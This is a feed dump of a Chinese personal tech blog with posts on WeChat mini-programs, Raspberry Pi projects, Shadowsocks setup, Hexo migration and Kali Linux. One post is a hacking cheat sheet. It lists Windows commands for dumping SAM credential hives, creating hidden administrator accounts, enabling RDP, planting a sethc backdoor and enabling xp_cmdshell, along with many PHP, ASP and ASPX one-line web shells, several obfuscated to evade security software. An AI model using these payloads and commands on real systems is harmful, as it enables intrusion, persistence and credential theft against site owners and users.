<p>其中wxss文件类似于css，所有css语法均支持<br>js是APP()<br>json文件是层级设置，页面的形态<br>wxml文件更像是xml和html的混合版</p>
<p><img src="/content/images/wechat/3.jpg" alt=""></p>
<p>IDE并不强大，但是是用HTML写的，有点类似于VS CODE。</p>
<h1 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h1><ul>
<li><strong>HTML5是未来，腾讯帮助整个生态系统往前走了一大步。</strong></li>
<li>腾讯有巨大用户群的优势，使得部分程序，尤其是企业程序的开发成本大幅度降低，跨平台变得更加简单通用。</li>
<li>有统一开发的IDE，包括IDE也是一个HTML5程序，这就是未来。</li>
<li>开发简单，入门门槛低。</li>
</ul>
<h1 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h1><ul>
<li>不支持引用js，比如jquery等众多优秀的js插件。</li>
<li>可移植性差，如果以后还有XX app想做个小程序功能，你需要跳出这个体系，重新做，这是巨大的成本。我想这也就是腾讯想把你牢牢地拴在他所创建的体系下的方式。</li>
<li>随时有被App Store封掉的风险，苹果不允许程序里嵌套程序，我觉得小程序做不长久，可以参考当年下架Adode的flash文件直接转换的ipa文件事件。</li>
<li>没有react native好，这是两个完全不同的概念，腾讯创建出的小程序似乎更像是js+html+css，react才是未来。</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我想用一句名言总结一下前端趋势及未来App趋势：</p>
<blockquote>
<p>Any application that can be written in JavaScript, will eventually be written in JavaScript.</p>
</blockquote>
<p>腾讯的想法是非常好的，让JavaScript去干一切事情，这就是未来。Java喊了好几年了一次编译到处运行，全世界没有程序员不知道，但实际呢？JavaScript似乎是真正把这件事情做成了，JavaScript作为网站的前端默默地发展了几十年，现在趋势越来越明显，随着浏览器内核的运行效率的大幅度提升，这些看似不不现实的趋势越来越明显，那就是网页程序。</p>
<p>不过受限于App store不知道能否有较大的发展，开发者看似十分火爆的东西，真正在用户层次上能否一样的火爆，不得人知，让时间去检验一切吧。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。&lt;br&gt;
    
    </summary>
    
      <category term="Web" scheme="http://blog.yfgeek.com/categories/Web/"/>
    
    
      <category term="Web" scheme="http://blog.yfgeek.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>树莓派搭建ss服务器</title>
    <link href="http://blog.yfgeek.com/2016/09/13/ss-server/"/>
    <id>http://blog.yfgeek.com/2016/09/13/ss-server/</id>
    <published>2016-09-13T22:38:35.000Z</published>
    <updated>2016-11-19T11:35:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器</p>
<h1 id="为什么不用pptp-vpn"><a href="#为什么不用pptp-vpn" class="headerlink" title="为什么不用pptp vpn"></a>为什么不用pptp vpn</h1><p>这是个好问题，实际上我已经搭建了pptp vpn，只是连不上，大概是因为国内运营商中国电信做了端口屏蔽限制，目前发现已经屏蔽的端口有80和PPTP的端口。</p>
<h1 id="一键配置脚本"><a href="#一键配置脚本" class="headerlink" title="一键配置脚本"></a>一键配置脚本</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">wget http://mirrors.linuxeye.com/oneinstack.tar.gz</div><div class="line">tar xzf oneinstack.tar.gz</div><div class="line">cd oneinstack</div><div class="line">./shadowsocks.sh install</div></pre></td></tr></table></figure>
<p>漫长的等待结束就好了</p>
<h1 id="慢慢配置"><a href="#慢慢配置" class="headerlink" title="慢慢配置"></a>慢慢配置</h1><h2 id="安装Pip"><a href="#安装Pip" class="headerlink" title="安装Pip"></a>安装Pip</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install python-pip python-gevent python-m2crypto</div></pre></td></tr></table></figure>
<h2 id="安装Shadowsocks"><a href="#安装Shadowsocks" class="headerlink" title="安装Shadowsocks"></a>安装Shadowsocks</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install shadowsocks</div></pre></td></tr></table></figure>
<h2 id="创建Shadowsocks配置文件"><a href="#创建Shadowsocks配置文件" class="headerlink" title="创建Shadowsocks配置文件"></a>创建Shadowsocks配置文件</h2><p>配置文件 <code>/etc/shadowsocks.json</code> 内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &quot;server&quot;:&quot;0.0.0.0&quot;,</div><div class="line">    &quot;server_port&quot;:8388,</div><div class="line">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</div><div class="line">    &quot;local_port&quot;:1080,</div><div class="line">    &quot;password&quot;:&quot;密码&quot;,</div><div class="line">    &quot;timeout&quot;:300,</div><div class="line">    &quot;method&quot;:&quot;aes-256-cfb&quot;,</div><div class="line">    &quot;fast_open&quot;: false,</div><div class="line">    &quot;workers&quot;: 1</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nohup ssserver -c /etc/shadowsocks.json &amp;</div></pre></td></tr></table></figure>
<h2 id="设定为自动启动的方法"><a href="#设定为自动启动的方法" class="headerlink" title="设定为自动启动的方法"></a>设定为自动启动的方法</h2><p>写入 <code>nohup ssserver -c /etc/shadowsocks.json &amp;</code> 到 /etc/rc.local 文件的 exit 之前。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器&lt;/p&gt;
&lt;h1
    
    </summary>
    
      <category term="Linux" scheme="http://blog.yfgeek.com/categories/Linux/"/>
    
    
      <category term="Raspberry" scheme="http://blog.yfgeek.com/tags/Raspberry/"/>
    
  </entry>
  
  <entry>
    <title>GHOST搬迁到HEXO(Github Pages)指南</title>
    <link href="http://blog.yfgeek.com/2016/09/12/GHOST%E6%90%AC%E8%BF%81%E5%88%B0HEXO-Github-Pages-%E6%8C%87%E5%8D%97/"/>
    <id>http://blog.yfgeek.com/2016/09/12/GHOST搬迁到HEXO-Github-Pages-指南/</id>
    <published>2016-09-12T20:41:59.000Z</published>
    <updated>2016-11-19T11:35:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>想了很长时间，权衡了一下利弊，还是觉得Github Pages平台会好一些，虽然可能我用了几天就会被和谐掉。</p>
<p>但是GHOST还需要找专门能够运行Node的平台，在这方面，全静态的HEXO绝对是博客的首选。</p>
<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>在搬家之前，首先你要有一个Github，或者Gitlab，本文不过多叙述：</p>
<ul>
<li>安装HEXO</li>
<li>配置Github</li>
</ul>
<h1 id="搬家"><a href="#搬家" class="headerlink" title="搬家"></a>搬家</h1><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>Ghost导出数据json：实验室-导出，下载好json</p>
<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>安装搬家工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm i hexo-migrator-ghost --save</div></pre></td></tr></table></figure></p>
<h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>修改<code>./scaffolds/post.md</code>文件内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">title: &#123;&#123; title &#125;&#125;  </div><div class="line">date: &#123;&#123; date &#125;&#125;  </div><div class="line">tags: &#123;&#123; tags &#125;&#125;  </div><div class="line">---</div></pre></td></tr></table></figure>
<h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>将json文件放到根目录，并且执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">hexo migrate ghost source.json  </div><div class="line">hexo clean ; hexo d -g</div></pre></td></tr></table></figure>
<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>经过以上步骤，基本上是搬家完毕了，但是仍有一些需要注意的：</p>
<ul>
<li>HEXO的Markdown语法比较严谨，所以倒入进来会存在问题，需要进一步修正，比如#如果前面不空格是不解析标题的</li>
<li>tag可能会出问题，会自动加–，请自行删除，或者批量删除</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;想了很长时间，权衡了一下利弊，还是觉得Github Pages平台会好一些，虽然可能我用了几天就会被和谐掉。&lt;/p&gt;
&lt;p&gt;但是GHOST还
    
    </summary>
    
      <category term="Web" scheme="http://blog.yfgeek.com/categories/Web/"/>
    
    
      <category term="Web" scheme="http://blog.yfgeek.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>那些Hack神器及奇技淫巧</title>
    <link href="http://blog.yfgeek.com/2016/09/11/hacktool/"/>
    <id>http://blog.yfgeek.com/2016/09/11/hacktool/</id>
    <published>2016-09-11T22:07:28.000Z</published>
    <updated>2016-11-19T11:35:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。</p>
<h1 id="那些网站"><a href="#那些网站" class="headerlink" title="那些网站"></a>那些网站</h1><h2 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a>社工库</h2><h3 id="国内"><a href="#国内" class="headerlink" title="国内"></a>国内</h3><p><a href="http://www.findmima.com/" target="_blank" rel="external">http://www.findmima.com/</a></p>
<p><a href="http://www.wghostk.com/so/" target="_blank" rel="external">http://www.wghostk.com/so/</a></p>
<p><a href="http://p.08lt.com" target="_blank" rel="external">http://p.08lt.com</a></p>
<p><a href="http://www.144118.com/" target="_blank" rel="external">http://www.144118.com/</a></p>
<h3 id="国际"><a href="#国际" class="headerlink" title="国际"></a>国际</h3><p><a href="https://haveibeenpwned.com/" target="_blank" rel="external">https://haveibeenpwned.com/</a></p>
<p><a href="https://leakbase.pw/" target="_blank" rel="external">https://leakbase.pw/</a></p>
<h2 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h2><p><a href="http://www.144118.com/" target="_blank" rel="external">http://www.144118.com/</a></p>
<h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><p><a href="http://whois.domaintools.com/" target="_blank" rel="external">http://whois.domaintools.com/</a></p>
<h2 id="历史页面"><a href="#历史页面" class="headerlink" title="历史页面"></a>历史页面</h2><h1 id="那些实用命令"><a href="#那些实用命令" class="headerlink" title="那些实用命令"></a>那些实用命令</h1><h2 id="reg导出sam"><a href="#reg导出sam" class="headerlink" title="reg导出sam"></a>reg导出sam</h2><p>reg save hklm\sam sam.hive</p>
<p>reg save hklm\system system.hive</p>
<p>reg save hklm\security security.hive</p>
<h2 id="Windows新建用户"><a href="#Windows新建用户" class="headerlink" title="Windows新建用户"></a>Windows新建用户</h2><p>net user admin$ admin /add</p>
<p>net localgroup administrators admin$ /add</p>
<p>net user Guest 1234</p>
<p>net user Guest /active:yes</p>
<p>net localgroup administrators Guest /add</p>
<h2 id="打开3389-2003-xp"><a href="#打开3389-2003-xp" class="headerlink" title="打开3389(2003,xp)"></a>打开3389(2003,xp)</h2><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>
<h2 id="sethc后门"><a href="#sethc后门" class="headerlink" title="sethc后门"></a>sethc后门</h2><p>Copy C:\windows\explorer.exe C:\Windows\System32\sethc.exe /y</p>
<h2 id="mssql-xpcmdshell报错"><a href="#mssql-xpcmdshell报错" class="headerlink" title="mssql xpcmdshell报错"></a>mssql xpcmdshell报错</h2><p>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p>
<h1 id="那些一句话"><a href="#那些一句话" class="headerlink" title="那些一句话"></a>那些一句话</h1><h2 id="asp一句话木马"><a href="#asp一句话木马" class="headerlink" title="asp一句话木马"></a>asp一句话木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;%eval request(&quot;x&quot;)%&gt;</div></pre></td></tr></table></figure>
<h2 id="php一句话木马"><a href="#php一句话木马" class="headerlink" title="php一句话木马"></a>php一句话木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php eval($_POST[g]);?&gt;</div></pre></td></tr></table></figure>
<h2 id="aspx一句话"><a href="#aspx一句话" class="headerlink" title="aspx一句话"></a>aspx一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;x&quot;],&quot;unsafe&quot;);%&gt;</div></pre></td></tr></table></figure>
<h2 id="数据库加密一句话-密码a"><a href="#数据库加密一句话-密码a" class="headerlink" title="数据库加密一句话(密码a)"></a>数据库加密一句话(密码a)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">┼攠數畣整爠煥敵瑳∨≡┩愾</div></pre></td></tr></table></figure>
<h2 id="网站配置、版权信息专用一句话"><a href="#网站配置、版权信息专用一句话" class="headerlink" title="网站配置、版权信息专用一句话"></a>网站配置、版权信息专用一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;%&gt;&lt;%Eval Request(x)%&gt;</div></pre></td></tr></table></figure>
<h2 id="一句话再过护卫神"><a href="#一句话再过护卫神" class="headerlink" title="一句话再过护卫神"></a>一句话再过护卫神</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt;</div></pre></td></tr></table></figure>
<h2 id="过拦截一句话木马"><a href="#过拦截一句话木马" class="headerlink" title="过拦截一句话木马"></a>过拦截一句话木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;% eXEcGlOBaL ReQuEsT(&quot;x&quot;) %&gt;</div></pre></td></tr></table></figure>
<h2 id="asp闭合型一句话"><a href="#asp闭合型一句话" class="headerlink" title="asp闭合型一句话"></a>asp闭合型一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&gt;&lt;%eval request(&quot;0o1Znz1ow&quot;)%&gt;&lt;%</div></pre></td></tr></table></figure>
<h2 id="能过安全狗的解析格式"><a href="#能过安全狗的解析格式" class="headerlink" title="能过安全狗的解析格式"></a>能过安全狗的解析格式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg</div></pre></td></tr></table></figure>
<h2 id="突破安全狗的一句话"><a href="#突破安全狗的一句话" class="headerlink" title="突破安全狗的一句话"></a>突破安全狗的一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%eval(Y)%&gt;</div></pre></td></tr></table></figure>
<h2 id="elong过安全狗的php一句话"><a href="#elong过安全狗的php一句话" class="headerlink" title="elong过安全狗的php一句话"></a>elong过安全狗的php一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[cc]);  ?&gt;</div></pre></td></tr></table></figure>
<h2 id="后台常用写入php一句话（密码x）"><a href="#后台常用写入php一句话（密码x）" class="headerlink" title="后台常用写入php一句话（密码x）"></a>后台常用写入php一句话（密码x）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;? </div><div class="line"> $fp = @fopen(&quot;c.php&quot;, &apos;a&apos;); </div><div class="line"> @fwrite($fp, &apos;&lt;&apos;.&apos;?php&apos;.&quot;\r\n\r\n&quot;.&apos;eval($_POST[x])&apos;.&quot;\r\n\r\n?&quot;.&quot;&gt;\r\n&quot;); </div><div class="line"> @fclose($fp); </div><div class="line"> ?&gt;</div></pre></td></tr></table></figure>
<h2 id="高强度php一句话"><a href="#高强度php一句话" class="headerlink" title="高强度php一句话"></a>高强度php一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php substr(md5($_REQUEST[&apos;heroes&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>
<h2 id="新型变异PHP一句话-密码b4dboy"><a href="#新型变异PHP一句话-密码b4dboy" class="headerlink" title="新型变异PHP一句话(密码b4dboy)"></a>新型变异PHP一句话(密码b4dboy)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">($b4dboy = $_POST[&apos;b4dboy&apos;]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);</div></pre></td></tr></table></figure>
<h2 id="突破安全狗的aspx一句话"><a href="#突破安全狗的aspx一句话" class="headerlink" title="突破安全狗的aspx一句话"></a>突破安全狗的aspx一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;%@ Page Language=&quot;C#&quot; ValidateRequest=&quot;false&quot; %&gt;</div><div class="line">&lt;%try&#123; System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[&quot;你的密码&quot;].Value))).CreateInstance(&quot;c&quot;, true, System.Reflection.BindingFlags.Default, null, new object[] &#123; this &#125;, null, null); &#125; catch &#123; &#125;%&gt;</div></pre></td></tr></table></figure>
<h2 id="突破护卫神，保护盾一句话"><a href="#突破护卫神，保护盾一句话" class="headerlink" title="突破护卫神，保护盾一句话"></a>突破护卫神，保护盾一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);</div><div class="line">$a($_POST[&quot;test&quot;]); ?&gt;</div></pre></td></tr></table></figure>
<h2 id="PHP高强度一句话："><a href="#PHP高强度一句话：" class="headerlink" title="PHP高强度一句话："></a>PHP高强度一句话：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php substr(md5($_REQUEST[&apos;x&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>
<p>菜刀连接：<code>/x.php?x=lostwolf</code>  脚本类型：php  密码：c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php assert($_REQUEST[&quot;c&quot;]);?&gt;</div></pre></td></tr></table></figure></p>
<h2 id="aspx过狗"><a href="#aspx过狗" class="headerlink" title="aspx过狗"></a>aspx过狗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%var name:String=Request.Item[&quot;cmd&quot;];Response.Write(eval(name,&quot;unsafe&quot;));%&gt;</div></pre></td></tr></table></figure>
<h1 id="那些神器"><a href="#那些神器" class="headerlink" title="那些神器"></a>那些神器</h1><ul>
<li>Sqlmap</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。&lt;/p&gt;
&lt;h1 id=&quot;那些网站&quot;&gt;&lt;a hre
    
    </summary>
    
      <category term="Hack" scheme="http://blog.yfgeek.com/categories/Hack/"/>
    
    
      <category term="Hack" scheme="http://blog.yfgeek.com/tags/Hack/"/>
    
  </entry>
  
  <entry>
    <title>树莓派实时温度湿度监测进阶</title>
    <link href="http://blog.yfgeek.com/2016/08/26/runtimelcd/"/>
    <id>http://blog.yfgeek.com/2016/08/26/runtimelcd/</id>
    <published>2016-08-26T14:19:14.000Z</published>
    <updated>2016-11-19T11:35:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。</p>
<h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><ul>
<li>Adafruit_DHT</li>
<li>Adafruit_CharLCD</li>
<li>Nginx/Apache (请自行提前安装)</li>
</ul>
<h1 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install build-essential python-dev python-smbus python-pip</div><div class="line">git <span class="built_in">clone</span> https://github.com/adafruit/Adafruit_Python_DHT.git</div><div class="line"><span class="built_in">cd</span> Adafruit_Python_DHT</div><div class="line">sudo python setup.py install</div><div class="line">sudo pip install RPi.GPIO</div><div class="line">git <span class="built_in">clone</span> https://github.com/adafruit/Adafruit_Python_CharLCD</div><div class="line"><span class="built_in">cd</span> Adafruit_Python_CharLCD</div><div class="line">sudo python setup.py install</div></pre></td></tr></table></figure>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /var/www/html</div><div class="line">git <span class="built_in">clone</span>  https://github.com/yfgeek/rpi-TempRuntime.git</div></pre></td></tr></table></figure>
<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /var/www/html/rpi-TempRuntime</div><div class="line">python LCD.py</div></pre></td></tr></table></figure>
<h1 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h1><p><img src="/content/images/2016/08/WechatIMG10.jpeg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。&lt;/p&gt;
&lt;h1 id=&quot;依赖&quot;&gt;&lt;a href=&quot;#依赖&quot; class=&quot;headerlink&quot; title=&quot;依赖&quot;&gt;&lt;/a&gt;依赖&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;Adafruit_DHT&lt;
    
    </summary>
    
    
      <category term="Raspberry" scheme="http://blog.yfgeek.com/tags/Raspberry/"/>
    
  </entry>
  
  <entry>
    <title>把KALI放到U盘里</title>
    <link href="http://blog.yfgeek.com/2016/08/25/ba-kalifang-dao-upan-li/"/>
    <id>http://blog.yfgeek.com/2016/08/25/ba-kalifang-dao-upan-li/</id>
    <published>2016-08-25T18:26:45.000Z</published>
    <updated>2016-08-25T18:29:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>步骤1：进入 bios设置U盘启动，保存并启动电脑</p>
<p>步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。<br><a id="more"></a><br>步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。</p>
<p>关掉gparted ，在命令行里输入以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir /mnt/usb</div><div class="line">mount /dev/sdb2 /mnt/usb</div><div class="line"><span class="built_in">echo</span> <span class="string">"/ union"</span> &gt;&gt; /mnt/usb/persistence.conf</div><div class="line">umount /mnt/usb</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;步骤1：进入 bios设置U盘启动，保存并启动电脑&lt;/p&gt;
&lt;p&gt;步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。&lt;br&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://blog.yfgeek.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>基于树莓派的实时温度湿度监测平台</title>
    <link href="http://blog.yfgeek.com/2016/08/25/rpi-tmp-hdt-platform/"/>
    <id>http://blog.yfgeek.com/2016/08/25/rpi-tmp-hdt-platform/</id>
    <published>2016-08-25T12:39:08.000Z</published>
    <updated>2016-08-25T18:28:59.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。</p>
<p>在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。<br><a id="more"></a> </p>
<h1 id="知识储备"><a href="#知识储备" class="headerlink" title="知识储备"></a>知识储备</h1><ul>
<li>数字电子技术基础</li>
<li>微机原理与接口技术</li>
<li>python语言</li>
</ul>
<h1 id="原料"><a href="#原料" class="headerlink" title="原料"></a>原料</h1><ul>
<li>树莓派3B</li>
<li>DHT11</li>
<li>LCD1602</li>
<li>2K电阻（也可以是电位器）</li>
<li>子-母 和 母-母 杜邦线</li>
<li>电气绝缘胶带</li>
<li>剪刀</li>
<li>一颗耐心和一颗细心</li>
</ul>
<h1 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h1><ul>
<li>Python 2.7</li>
</ul>
<h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><ul>
<li>python-dev</li>
<li>python-rpi.gpio<br>如果不具备以上，请执行：<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install python-dev</div><div class="line">sudo apt-get install python-rpi.gpio</div></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="接线"><a href="#接线" class="headerlink" title="接线"></a>接线</h1><p>我们一共要完成两个任务：</p>
<ul>
<li>1.连接LCD1602</li>
<li>2.连接DHT11</li>
</ul>
<p>树莓派3B的GPIO图如下：</p>
<p><img src="/content/images/2016/08/GPIO.png" alt=""></p>
<h2 id="2K-电阻如何连接到电路"><a href="#2K-电阻如何连接到电路" class="headerlink" title="2K 电阻如何连接到电路"></a>2K 电阻如何连接到电路</h2><p>简单粗暴的方法就是把电阻两头连接到两个子-母杜邦线上，然后用绝缘胶布缠上，非常方便美观。</p>
<h2 id="LCD1602-接线方案"><a href="#LCD1602-接线方案" class="headerlink" title="LCD1602 接线方案"></a>LCD1602 接线方案</h2><p>LCD 与 树莓派相连 方案图，2K电阻是我自行设计，如果有电位器最好放置电位器：<br><img src="/content/images/2016/08/LCD1602--.jpg" alt=""></p>
<p>树莓派的USB端口朝下，电源线位置朝上方向摆放。<br>右端一共有40个引脚，每个引脚的PIN位置如上。</p>
